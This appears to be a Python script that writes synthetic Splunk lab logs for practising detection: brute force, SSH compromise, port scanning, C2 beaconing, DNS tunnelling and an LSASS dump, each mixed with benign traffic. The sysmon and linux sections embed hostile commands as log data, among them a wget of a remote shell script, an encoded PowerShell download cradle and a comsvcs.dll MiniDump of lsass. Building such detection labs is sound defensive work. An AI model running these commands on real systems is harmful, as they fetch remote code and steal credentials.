#!/usr/bin/env python3
"""
Generate synthetic lab logs beside the real ones (../../Splunk/Raw logs/gen_*.csv), then add them to
Raw_logs.zip. Deterministic (fixed seed): running it again writes the same files.

    python3 generate_logs.py            # then: python3 load_raw_logs.py

Each scenario is mixed with ordinary activity of the same kind, so a detection rule has something to
leave out. Everything is fictional: hosts, accounts, addresses (internal 10.10.0.0/16, external from
the documentation ranges and a few addresses used only as lab C2), hashes.

    gen_wineventlog_auth.csv  wineventlog        4625 brute force / password spray, then a 4624
    gen_linux_secure.csv      linux_secure       SSH brute force, a successful login, sudo to root
    gen_fortigate.csv         fortigate          internal port scan; beaconing to C2 every ~60 s
    gen_dns.csv               bind_query         DNS tunnelling over long random TXT queries
    gen_sysmon.csv            sysmon             encoded PowerShell from Word; LSASS memory dump

The format of each file is what load_raw_logs.py parses: one event per CSV row, no header.
"""

from __future__ import annotations

import base64
import csv
import hashlib
import random
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
LOGS = HERE.parent.parent / "Splunk" / "Raw logs"
ZIP = LOGS.parent / "Raw_logs.zip"
DAY = datetime(2024, 12, 24, tzinfo=timezone.utc)
PACIFIC = timedelta(hours=-8)  # load_raw_logs.py reads wineventlog times as US/Pacific (PST in December)
rnd = random.Random(20241224)


def at(hh: int, mm: int, ss: float = 0) -> datetime:
    return DAY + timedelta(hours=hh, minutes=mm, seconds=ss)


def sha256(seed: str) -> str:
    return hashlib.sha256(seed.encode()).hexdigest().upper()


def write(name: str, events: list[tuple[datetime, str]]) -> None:
    events.sort(key=lambda e: e[0])
    with (LOGS / name).open("w", encoding="utf-8", newline="") as handle:
        writer = csv.writer(handle)
        for _, raw in events:
            writer.writerow([raw])
    print(f"{name}: {len(events)} events")


# ── Windows Security: 4625 / 4624 ───────────────────────────────────────────

_record = iter(range(220000, 999999))


def win_logon(t: datetime, host: str, ok: bool, user: str, domain: str, src: str, workstation: str,
              logon_type: int = 3, reason: str = "Unknown user name or bad password.", sub: str = "0xC000006A") -> str:
    local = (t + PACIFIC).strftime("%m/%d/%Y %I:%M:%S %p")
    port = rnd.randint(49152, 65535)
    head = (f"{local}\nLogName=Security\nEventCode={4624 if ok else 4625}\nEventType=0\nComputerName={host}\n"
            f"SourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber={next(_record)}\n"
            f"Keywords={'Audit Success' if ok else 'Audit Failure'}\nTaskCategory=Logon\nOpCode=Info\n")
    if ok:
        return head + (
            "Message=An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tNULL SID\n"
            "\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\n"
            f"Logon Information:\n\tLogon Type:\t\t{logon_type}\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n"
            "\tElevated Token:\t\tYes\n\n"
            f"New Logon:\n\tSecurity ID:\t\t{domain}\\{user}\n\tAccount Name:\t\t{user}\n\tAccount Domain:\t\t{domain}\n"
            f"\tLogon ID:\t\t0x{rnd.randint(0x100000, 0xFFFFFF):X}\n\n"
            f"Network Information:\n\tWorkstation Name:\t{workstation}\n\tSource Network Address:\t{src}\n\tSource Port:\t\t{port}\n\n"
            "Detailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp\n\tAuthentication Package:\tNTLM")
    return head + (
        "Message=An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n"
        "\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\n"
        f"Logon Type:\t\t\t{logon_type}\n\n"
        f"Account For Which Logon Failed:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t{user}\n\tAccount Domain:\t\t{domain}\n\n"
        f"Failure Information:\n\tFailure Reason:\t\t{reason}\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t{sub}\n\n"
        f"Network Information:\n\tWorkstation Name:\t{workstation}\n\tSource Network Address:\t{src}\n\tSource Port:\t\t{port}\n\n"
        "Detailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp\n\tAuthentication Package:\tNTLM")


def windows_auth() -> list[tuple[datetime, str]]:
    ev = []
    # Password spray then brute force against FS-01 from 10.10.30.66, ending in one success (svc_backup).
    users = ["administrator", "admin", "svc_backup", "svc_sql", "it.support", "backup", "test", "guest",
             "somchai.k", "nattaya.p", "kittipong.s", "operator"]
    t = at(18, 10)
    for i in range(160):
        user = users[i % len(users)] if i < 72 else "administrator"
        sub = "0xC0000064" if user in ("admin", "backup", "test", "operator") else "0xC000006A"
        reason = "Unknown user name or bad password."
        ev.append((t, win_logon(t, "FS-01", False, user, "CORP", "10.10.30.66", "KALI", sub=sub, reason=reason)))
        t += timedelta(seconds=rnd.uniform(0.8, 2.0))
    ev.append((t + timedelta(seconds=5), win_logon(t + timedelta(seconds=5), "FS-01", True, "svc_backup", "CORP", "10.10.30.66", "KALI")))
    # Ordinary: users who mistype once or twice, then log on.
    for hh, mm, user, src, ws in [(9, 2, "somchai.k", "10.10.20.21", "WS-21"), (11, 47, "nattaya.p", "10.10.20.34", "WS-34"),
                                  (14, 15, "kittipong.s", "10.10.20.12", "WS-12"), (16, 30, "pimchanok.r", "10.10.20.45", "WS-45")]:
        t = at(hh, mm)
        for _ in range(rnd.randint(1, 3)):
            ev.append((t, win_logon(t, "FS-01", False, user, "CORP", src, ws)))
            t += timedelta(seconds=rnd.uniform(4, 15))
        ev.append((t, win_logon(t, "FS-01", True, user, "CORP", src, ws)))
    # Ordinary: interactive and network logons across the day.
    for _ in range(60):
        t = at(rnd.randint(8, 19), rnd.randint(0, 59), rnd.randint(0, 59))
        n = rnd.choice([12, 21, 34, 45, 51, 63])
        user = rnd.choice(["somchai.k", "nattaya.p", "kittipong.s", "pimchanok.r", "it.support"])
        ev.append((t, win_logon(t, "FS-01", True, user, "CORP", f"10.10.20.{n}", f"WS-{n}")))
    return ev


# ── Linux sshd / sudo ───────────────────────────────────────────────────────

def linux() -> list[tuple[datetime, str]]:
    ev, pid = [], iter(range(2200, 99999))

    def line(t: datetime, msg: str) -> tuple[datetime, str]:
        return t, f"{t.strftime('%Y-%m-%dT%H:%M:%S')}+00:00 web-02 {msg}"

    attacker = "203.0.113.45"
    t = at(18, 20)
    for i in range(300):
        user = rnd.choice(["root", "admin", "test", "ubuntu", "oracle", "postgres", "deploy", "git", "user"])
        invalid = "" if user in ("root", "deploy", "ubuntu") else "invalid user "
        ev.append(line(t, f"sshd[{next(pid)}]: Failed password for {invalid}{user} from {attacker} port {rnd.randint(32768, 60999)} ssh2"))
        t += timedelta(seconds=rnd.uniform(0.6, 1.6))
    t += timedelta(seconds=3)
    p = next(pid)
    ev.append(line(t, f"sshd[{p}]: Accepted password for deploy from {attacker} port 51200 ssh2"))
    ev.append(line(t, f"sshd[{p}]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)"))
    t += timedelta(seconds=40)
    ev.append(line(t, "sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"))
    t += timedelta(seconds=25)
    ev.append(line(t, "sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://45.83.122.9/x.sh -O /tmp/x.sh"))
    # Ordinary: ops with keys, a scanner of the internet giving up after a few tries.
    for _ in range(40):
        t = at(rnd.randint(8, 19), rnd.randint(0, 59), rnd.randint(0, 59))
        p = next(pid)
        ev.append(line(t, f"sshd[{p}]: Accepted publickey for ops from 10.10.20.30 port {rnd.randint(40000, 60000)} ssh2: RSA SHA256:q3nGm1"))
        ev.append(line(t, f"sshd[{p}]: pam_unix(sshd:session): session opened for user ops(uid=1000) by (uid=0)"))
    for k in range(6):
        t = at(rnd.randint(1, 7), rnd.randint(0, 59))
        src = f"198.51.100.{rnd.randint(2, 250)}"
        for _ in range(rnd.randint(2, 4)):
            ev.append(line(t, f"sshd[{next(pid)}]: Failed password for invalid user admin from {src} port {rnd.randint(32768, 60999)} ssh2"))
            t += timedelta(seconds=rnd.uniform(2, 6))
    return ev


# ── FortiGate traffic ───────────────────────────────────────────────────────

def fgt(t: datetime, src: str, sport: int, dst: str, dport: int, action: str, service: str, country: str,
        sent: int = 0, rcvd: int = 0, dstintf: str = "wan1") -> tuple[datetime, str]:
    return t, (f'date={t.strftime("%Y-%m-%d")} time={t.strftime("%H:%M:%S")} devname="FGT-01" devid="FG100FTK19000001" '
               f'logid="{"0000000013" if action == "accept" else "0000000011"}" type="traffic" subtype="forward" '
               f'level="{"notice" if action == "accept" else "warning"}" srcip={src} srcport={sport} srcintf="lan" '
               f'dstip={dst} dstport={dport} dstintf="{dstintf}" proto=6 action="{action}" policyid={1 if action == "accept" else 99} '
               f'service="{service}" dstcountry="{country}" sentbyte={sent} rcvdbyte={rcvd}')


def fortigate() -> list[tuple[datetime, str]]:
    ev = []
    # Internal port scan: 10.10.40.23 across 1,024 ports of four servers, denied by the internal policy.
    t = at(18, 30)
    for target in ("10.10.50.10", "10.10.50.11", "10.10.50.12", "10.10.50.20"):
        for port in rnd.sample(range(1, 65535), 256):
            accept = port in (22, 80, 443, 445, 3389)
            ev.append(fgt(t, "10.10.40.23", rnd.randint(40000, 60000), target, port, "accept" if accept else "deny",
                          f"tcp/{port}", "Reserved", 60 if accept else 0, 40 if accept else 0, "dmz"))
            t += timedelta(seconds=rnd.uniform(0.05, 0.2))
    # Beaconing: WS-77 (10.10.20.77) to 45.83.122.9:443 every 60 s ±2 s, small and even payloads, 3 hours.
    t = at(16, 0, 7)
    while t < at(19, 0):
        ev.append(fgt(t, "10.10.20.77", rnd.randint(49152, 65535), "45.83.122.9", 443, "accept", "HTTPS",
                      "Netherlands", rnd.randint(480, 540), rnd.randint(1180, 1260)))
        t += timedelta(seconds=60 + rnd.uniform(-2, 2))
    # Ordinary browsing and updates from the office.
    sites = [("142.250.4.100", "United States"), ("13.107.42.14", "United States"), ("104.18.32.7", "United States"),
             ("203.150.10.5", "Thailand"), ("52.84.150.11", "Japan"), ("20.190.160.20", "Singapore")]
    for _ in range(1500):
        t = at(rnd.randint(8, 19), rnd.randint(0, 59), rnd.uniform(0, 59))
        dst, country = rnd.choice(sites)
        ev.append(fgt(t, f"10.10.20.{rnd.randint(10, 70)}", rnd.randint(49152, 65535), dst, rnd.choice([443, 443, 443, 80]),
                      "accept", "HTTPS", country, rnd.randint(500, 90000), rnd.randint(2000, 2_000_000)))
    for _ in range(60):  # the odd denied connection that is not a scan
        t = at(rnd.randint(8, 19), rnd.randint(0, 59), rnd.uniform(0, 59))
        ev.append(fgt(t, f"10.10.20.{rnd.randint(10, 70)}", rnd.randint(49152, 65535), "10.10.50.10",
                      rnd.choice([3389, 5985, 1433]), "deny", "tcp", "Reserved", dstintf="dmz"))
    return ev


# ── DNS (BIND query log) ────────────────────────────────────────────────────

def dns() -> list[tuple[datetime, str]]:
    ev = []

    def q(t: datetime, src: str, name: str, rtype: str) -> tuple[datetime, str]:
        stamp = t.strftime("%d-%b-%Y %H:%M:%S.") + f"{t.microsecond // 1000:03d}"
        return t, (f"{stamp} queries: info: client @0x7f3a{rnd.randint(1000, 9999)} {src}#{rnd.randint(1024, 65535)} "
                   f"({name}): query: {name} IN {rtype} + (10.10.1.53)")

    # Tunnelling: WS-88 sends 640 TXT queries with 40-60 character base32 labels under one domain, in 12 minutes.
    alphabet = "abcdefghijklmnopqrstuvwxyz234567"
    t = at(18, 40)
    for i in range(640):
        label = "".join(rnd.choice(alphabet) for _ in range(rnd.randint(40, 60)))
        ev.append(q(t, "10.10.20.88", f"{label}.{i % 97}.t1.exfil-dns.net", "TXT"))
        t += timedelta(seconds=rnd.uniform(0.6, 1.6))
    # Ordinary lookups.
    names = ["www.google.com", "login.microsoftonline.com", "outlook.office365.com", "www.bangkokbank.com",
             "update.microsoft.com", "time.windows.com", "api.github.com", "cdn.jsdelivr.net", "fs-01.corp.local",
             "_ldap._tcp.dc._msdcs.corp.local", "teams.microsoft.com", "www.youtube.com"]
    for _ in range(2500):
        t = at(rnd.randint(8, 19), rnd.randint(0, 59), rnd.uniform(0, 59))
        name = rnd.choice(names)
        ev.append(q(t, f"10.10.20.{rnd.randint(10, 90)}", name, "SRV" if name.startswith("_") else rnd.choice(["A", "A", "AAAA"])))
    for _ in range(40):  # a mail server checking SPF and DKIM: TXT, but short and to known domains
        t = at(rnd.randint(8, 19), rnd.randint(0, 59), rnd.uniform(0, 59))
        ev.append(q(t, "10.10.10.25", rnd.choice(["_spf.google.com", "selector1._domainkey.outlook.com", "corp.local"]), "TXT"))
    return ev


# ── Sysmon ──────────────────────────────────────────────────────────────────

_sysrec = iter(range(91000, 999999))


def sysmon(t: datetime, host: str, event_id: int, data: dict[str, str]) -> tuple[datetime, str]:
    stamp = t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond:06d}0Z"
    body = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in data.items())
    return t, ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
               "<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/>"
               f"<EventID>{event_id}</EventID><Version>5</Version><Level>4</Level><Task>{event_id}</Task><Opcode>0</Opcode>"
               f"<Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='{stamp}'/>"
               f"<EventRecordID>{next(_sysrec)}</EventRecordID><Correlation/><Execution ProcessID='3344' ThreadID='4012'/>"
               f"<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>{host}</Computer>"
               f"<Security UserID='S-1-5-18'/></System><EventData>{body}</EventData></Event>")


def proc(t: datetime, host: str, user: str, image: str, cmd: str, parent: str, parent_cmd: str) -> tuple[datetime, str]:
    utc = t.strftime("%Y-%m-%d %H:%M:%S.") + f"{t.microsecond // 1000:03d}"
    return sysmon(t, host, 1, {
        "RuleName": "-", "UtcTime": utc, "ProcessGuid": "{" + sha256(cmd + utc)[:8].lower() + "-6a1f-6767-1a03-000000000a00}",
        "ProcessId": str(rnd.randint(1000, 9000)), "Image": image, "FileVersion": "-", "Description": "-",
        "Product": "-", "Company": "-", "OriginalFileName": image.split("\\")[-1], "CommandLine": cmd,
        "CurrentDirectory": "C:\\Users\\Public\\", "User": user, "LogonGuid": "{6a1f6767-1a03-0000-0000-000000000000}",
        "LogonId": "0x3E7", "TerminalSessionId": "1", "IntegrityLevel": "High",
        "Hashes": f"SHA256={sha256(image)}", "ParentProcessGuid": "{6a1f6767-1a03-6767-0000-000000000b00}",
        "ParentProcessId": str(rnd.randint(1000, 9000)), "ParentImage": parent, "ParentCommandLine": parent_cmd,
        "ParentUser": user})


def access(t: datetime, host: str, source: str, target: str, granted: str, user: str) -> tuple[datetime, str]:
    utc = t.strftime("%Y-%m-%d %H:%M:%S.") + f"{t.microsecond // 1000:03d}"
    return sysmon(t, host, 10, {
        "RuleName": "-", "UtcTime": utc, "SourceProcessGUID": "{6a1f6767-1a03-6767-0000-000000000c00}",
        "SourceProcessId": str(rnd.randint(1000, 9000)), "SourceThreadId": str(rnd.randint(1000, 9000)),
        "SourceImage": source, "TargetProcessGUID": "{6a1f6767-0001-6767-0000-000000000d00}", "TargetProcessId": "640",
        "TargetImage": target, "GrantedAccess": granted,
        "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|C:\\Windows\\System32\\KERNELBASE.dll+2c0fe|UNKNOWN(00007FF8A1B2C3D4)",
        "SourceUser": user, "TargetUser": "NT AUTHORITY\\SYSTEM"})


def sysmon_events() -> list[tuple[datetime, str]]:
    ev = []
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    word = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://45.83.122.9/a.ps1')"
    enc = base64.b64encode(payload.encode("utf-16-le")).decode()
    # Encoded PowerShell from a Word document on WS-12.
    ev.append(proc(at(17, 45, 2.3), "WS-12.corp.local", "CORP\\kittipong.s", word,
                   f'"{word}" /n "C:\\Users\\kittipong.s\\Downloads\\Invoice_Dec2024.docm"', "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE"))
    ev.append(proc(at(17, 45, 9.8), "WS-12.corp.local", "CORP\\kittipong.s", ps, f"{ps} -NoP -NonI -W Hidden -Enc {enc}",
                   word, f'"{word}" /n "C:\\Users\\kittipong.s\\Downloads\\Invoice_Dec2024.docm"'))
    # LSASS dump on FS-01 after the brute force: rundll32 + comsvcs.dll MiniDump, full access to lsass.
    rundll = "C:\\Windows\\System32\\rundll32.exe"
    ev.append(proc(at(18, 16, 4.1), "FS-01.corp.local", "CORP\\svc_backup", "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /priv",
                   "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding"))
    ev.append(proc(at(18, 16, 30.5), "FS-01.corp.local", "CORP\\svc_backup", rundll,
                   f"{rundll} C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Users\\Public\\d.dmp full",
                   "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c"))
    ev.append(access(at(18, 16, 30.9), "FS-01.corp.local", rundll, "C:\\Windows\\system32\\lsass.exe", "0x1FFFFF", "CORP\\svc_backup"))
    # Ordinary PowerShell and ordinary access to lsass (Defender, the Windows error reporter).
    for _ in range(25):
        t = at(rnd.randint(8, 19), rnd.randint(0, 59), rnd.uniform(0, 59))
        n = rnd.choice([12, 21, 34, 45])
        ev.append(proc(t, f"WS-{n}.corp.local", "CORP\\it.support", ps,
                       f"{ps} -ExecutionPolicy Bypass -File C:\\IT\\Scripts\\{rnd.choice(['inventory', 'cleanup', 'printer-map'])}.ps1",
                       "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"))
    for _ in range(30):
        t = at(rnd.randint(8, 19), rnd.randint(0, 59), rnd.uniform(0, 59))
        host = rnd.choice(["FS-01.corp.local", "WS-12.corp.local", "WS-21.corp.local"])
        source, granted = rnd.choice([("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe", "0x1000"),
                                      ("C:\\Windows\\System32\\svchost.exe", "0x1000"), ("C:\\Windows\\System32\\wininit.exe", "0x1400")])
        ev.append(access(t, host, source, "C:\\Windows\\system32\\lsass.exe", granted, "NT AUTHORITY\\SYSTEM"))
    return ev


FILES = {
    "gen_wineventlog_auth.csv": windows_auth,
    "gen_linux_secure.csv": linux,
    "gen_fortigate.csv": fortigate,
    "gen_dns.csv": dns,
    "gen_sysmon.csv": sysmon_events,
}


def main() -> None:
    LOGS.mkdir(parents=True, exist_ok=True)
    for name, build in FILES.items():
        write(name, build())
    # Into the zip beside the real logs, so a fresh checkout extracts them too. Only names it lacks are added.
    with zipfile.ZipFile(ZIP, "a", compression=zipfile.ZIP_DEFLATED) as zf:
        have = set(zf.namelist())
        for name in FILES:
            arc = f"Raw logs/{name}"
            if arc not in have:
                zf.write(LOGS / name, arc)
                print(f"added {arc} to {ZIP.name}")


if __name__ == "__main__":
    main()
